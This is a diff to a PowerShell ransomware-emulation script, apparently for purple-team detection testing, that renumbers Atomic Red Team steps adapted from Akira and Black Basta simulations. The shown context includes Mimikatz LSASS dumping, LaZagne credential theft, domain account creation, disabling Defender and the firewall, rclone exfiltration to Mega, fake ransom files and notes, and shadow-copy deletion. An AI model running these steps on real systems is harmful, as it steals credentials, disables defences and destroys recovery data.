@@ -61,26 +61,26 @@ Invoke-AtomicTest T1069.002 -TestNumbers 1
 
 # This function is adapted from https://github.com/skandler/simulate-akira
 # Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
-# Atomic Test #7 T1046 - Network Service Discovery (advanced ip scanner)
+# Atomic Test #4 T1046 - Network Service Discovery (advanced ip scanner)
 echo "T1046 - Network Service Discovery (advanced ip scanner)"
 Invoke-WebRequest -Uri "https://download.advanced-ip-scanner.com/download/files/Advanced_IP_Scanner_2.5.4594.1.exe" -OutFile "C:\AtomicRedTeam\ExternalPayloads\Advanced_IP_Scanner_2.5.4594.1.exe"
 C:\AtomicRedTeam\ExternalPayloads\Advanced_IP_Scanner_2.5.4594.1.exe /SP- /VERYSILENT
 cmd.exe /c "C:\Program Files (x86)\Advanced IP Scanner\advanced_ip_scanner_console.exe" "/r:10.10.10.1-10.10.10.255"
 
-# Atomic Test #2 T1135 -  Network Share Discovery (SharpShares)
+# Atomic Test #5 T1135 -  Network Share Discovery (SharpShares)
 echo "T1135 - Network Share Discovery (SharpShares)"
 Invoke-WebRequest "https://github.com/mitchmoser/SharpShares/releases/download/v2.4/SharpShares.exe" -OutFile "C:\AtomicRedTeam\ExternalPayloads\SharpShares.exe"
 Invoke-AtomicTest T1135 -TestNumbers 11
 
 # This function is adapted from https://github.com/skandler/simulate-black-basta
 # Original file: https://github.com/skandler/simulate-black-basta/blob/main/Blackbasta_Ransomware_Atomic_Simulation.ps1
-#Atomic Test #23 T1021.001. Remote Services: Remote Desktop Protocol
+#Atomic Test #6 T1021.001. Remote Services: Remote Desktop Protocol
 echo "T1021.001. Remote Services: Remote Desktop Protocol"
 Invoke-AtomicTest T1021.001 -TestNumbers 1
 
 # This function is adapted from https://github.com/skandler/simulate-black-basta
 # Original file: https://github.com/skandler/simulate-black-basta/blob/main/Blackbasta_Ransomware_Atomic_Simulation.ps1
-#Atomic Test #20 - T1003.001 - OS Credential Dumping: LSASS Memory - with Mimikatz
+#Atomic Test #7 - T1003.001 - OS Credential Dumping: LSASS Memory - with Mimikatz
 echo "T1003.001 - OS Credential Dumping: LSASS Memory - with Mimikatz"
 Invoke-AtomicTest T1003.001 -TestNumbers 5
 Invoke-AtomicTest T1003.001 -TestNumbers 6 -GetPrereqs
@@ -89,34 +89,34 @@ Invoke-AtomicTest T1003.001 -TestNumbers 6
 
 # This function is adapted from https://github.com/skandler/simulate-akira
 # Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
-# Atomic Test 11 - T1555.003 - Dump Credentials using Lazagne
+# Atomic Test 8 - T1555.003 - Dump Credentials using Lazagne
 echo "T1555.003 - Dump Credentials using Lazagne"
 Invoke-AtomicTest T1555.003 -TestNumber 3 -GetPrereqs
 Invoke-AtomicTest T1555.003 -TestNumber 3
 
 # This function is adapted from https://github.com/skandler/simulate-akira
 # Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
-# Atomic Test #20 T1136.002 - Create Account: Domain Account - Username tanuki
+# Atomic Test #9 T1136.002 - Create Account: Domain Account - Username tanuki
 echo "T1136.002 - Create Account: Domain Account - Username tanuki"
 net user tanuki "pw@1234!" /add /domain
 Invoke-AtomicTest T1136.002 -TestNumbers 1
 
 # This function is adapted from https://github.com/skandler/simulate-akira
 # Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
-# Atomic Test #15 - T1053.005 - Scheduled Task Startup Script
+# Atomic Test #10 - T1053.005 - Scheduled Task Startup Script
 echo "T1053.005 - Scheduled Task Startup Script"
 Invoke-AtomicTest T1053.005 -TestNumbers 1
 
 # This function is adapted from https://github.com/skandler/simulate-black-basta
 # Original file: https://github.com/skandler/simulate-black-basta/blob/main/Blackbasta_Ransomware_Atomic_Simulation.ps1
-#Atomic Test #5 - T1569.002 - System Services: Service Execution Atomic Test #2 - Use PsExec to execute a command on a remote host
+#Atomic Test #11 - T1569.002 - System Services: Service Execution Atomic Test #2 - Use PsExec to execute a command on a remote host
 echo "T1569.002 - System Services (psexec)"
 Invoke-AtomicTest T1569.002 -TestNumbers 2 -GetPrereqs
 Invoke-AtomicTest T1569.002 -TestNumbers 2
 
 # This function is adapted from https://github.com/skandler/simulate-black-basta
 # Original file: https://github.com/skandler/simulate-black-basta/blob/main/Blackbasta_Ransomware_Atomic_Simulation.ps1
-# Atomic Test #29 T1559 Cobalt Strike usage
+# Atomic Test #12 T1559 Cobalt Strike usage
 echo "T1559 Cobalt Strike usage"
 Invoke-AtomicTest T1559 -TestNumbers 1 -GetPrereqs
 Invoke-AtomicTest T1559 -TestNumbers 1
@@ -126,37 +126,37 @@ Invoke-AtomicTest T1559 -TestNumbers 4
 
 # This function is adapted from https://github.com/skandler/simulate-akira
 # Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
-# Atomic Test #23 T1562.001 - Impair Defenses: Disable or Modify Tools - disable defender
+# Atomic Test #13 T1562.001 - Impair Defenses: Disable or Modify Tools - disable defender
 echo "T1562.001 - Impair Defenses: Disable or Modify Tools - disable defender"
 Invoke-AtomicTest T1562.001 -TestNumbers 16 #passt nicht ganz - defender Disable
 Invoke-AtomicTest T1562.001 -TestNumbers 27 #disable defender with dism
 
 # This function is adapted from https://github.com/skandler/simulate-akira
 # Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
-# Atomic Test #24 - T1562.004 - Disable Microsoft Defender Firewall via Registry
+# Atomic Test #14 - T1562.004 - Disable Microsoft Defender Firewall via Registry
 echo "T1562.004 - Disable Microsoft Defender Firewall via Registry"
 Invoke-AtomicTest T1562.004 -TestNumbers 2
 
 # This function is adapted from https://github.com/skandler/simulate-akira
 # Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
-# Atomic Test #25 - T1219 - Remote Access Software - AnyDesk Files Detected Test on Windows
+# Atomic Test #15 - T1219 - Remote Access Software - AnyDesk Files Detected Test on Windows
 echo "T1219 - Remote Access Software - AnyDesk Files Detected Test on Windows"
 Invoke-AtomicTest T1219 -TestNumbers 2
 
-# Atomic Test #27 T1074.001 - Data Staged: Local Data Staging
+# Atomic Test #16 T1074.001 - Data Staged: Local Data Staging
 echo "T1074.001 - Data Staged: Local Data Staging"
 Invoke-AtomicTest T1074.001 -TestNumbers 3
 
 # This function is adapted from https://github.com/skandler/simulate-akira
 # Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
-# Atomic Test #29 - T1567.002 - Exfiltrate data with rclone to cloud Storage - Mega (Windows)
+# Atomic Test #17 - T1567.002 - Exfiltrate data with rclone to cloud Storage - Mega (Windows)
 echo "T1567.002 - Exfiltrate data with rclone to cloud Storage - Mega (Windows)"
 Invoke-AtomicTest T1567.002 -GetPrereqs
 Invoke-AtomicTest T1567.002
 
 # This function is adapted from https://github.com/skandler/simulate-akira
 # Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
-# Test 31 - T1486 - Add Files with .tanuki file extension + Tanuki ransomnote
+# Test #18 - T1486 - Add Files with .tanuki file extension + Tanuki ransomnote
 echo "T1486 - Add 100 Files with .tanuki file extension and Tanuki ransomnote"
 1..100 | ForEach-Object { $out = new-object byte[] 1073741; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes("c:\encrypted.$_.tanuki", $out) }
 $users = Get-WmiObject Win32_UserProfile | Where-Object { $_.Special -eq $false -and $_.LocalPath -match 'Users' }
@@ -169,7 +169,7 @@ foreach ($user in $users) {
     }
 }
 
-# Test 31 - T1491 - Replace desktop wallpaper with Tanuki wallpaper
+# Test 19 - T1491 - Replace desktop wallpaper with Tanuki wallpaper
 echo "T1491 - Replace desktop wallpaper with Tanuki wallpaper"
 $url = "https://raw.githubusercontent.com/jw4n6/tanuki/main/tanukiwallpaper.jpg"
 $imgLocation = "$env:USERPROFILE\Pictures\tanukiwallpaper.jpg"
@@ -206,7 +206,7 @@ finally{
 
 # This function is adapted from https://github.com/skandler/simulate-akira
 # Original file: https://github.com/skandler/simulate-akira/blob/main/akira_ransomware_simulation.ps1
-# Atomic Test #32 - T1490 - Windows - Delete Volume Shadow Copies with Powershell
+# Atomic Test #20 - T1490 - Windows - Delete Volume Shadow Copies with Powershell
 echo "T1490 - Windows - Delete Volume Shadow Copies with Powershell"
 Invoke-AtomicTest T1490 -TestNumbers 5
 
